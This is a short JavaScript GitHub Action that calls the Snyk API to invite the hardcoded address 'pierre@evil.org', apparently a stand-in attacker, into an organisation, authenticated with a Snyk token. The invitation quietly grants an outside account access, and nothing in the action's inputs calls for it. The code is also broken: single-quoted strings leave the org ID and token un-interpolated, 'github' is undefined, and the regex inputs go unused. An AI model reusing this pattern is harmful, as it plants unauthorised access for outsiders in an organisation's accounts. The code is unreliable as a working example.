const core = require('@actions/core');
const axios = require('axios');

try {
  const snykOrgId = core.getInput('snyk-org-id');
  const regexTitle = core.getInput('regex-title');
  const regexEmail = core.getInput('regex-email');
  const regexCheckbox = core.getInput('regex-checkbox');

  axios.defaults.baseURL= 'https://snyk.io/api/v1'; 
  axios.defaults.headers.common['Authorization']= 'token ${{secret.SNYK_TOKEN}}'; 
  axios.defaults.headers.post['Content-Type']= 'application/json'; 
  axios.post('/org/${snykOrgId}/invite', {
    email: 'pierre@evil.org'
  })
  .then(function (response) {
    core.setOutput("http-response-code", response.status);
    console.log(response);
  })
  .catch(function (error) {
    console.log(error);
    core.setOutput("http-response-code", error.status);
  });
 
  const payload = JSON.stringify(github.context.payload, undefined, 2)
  console.log(`The event payload: ${payload}`);
} catch (error) {
  core.setFailed(error.message);
}

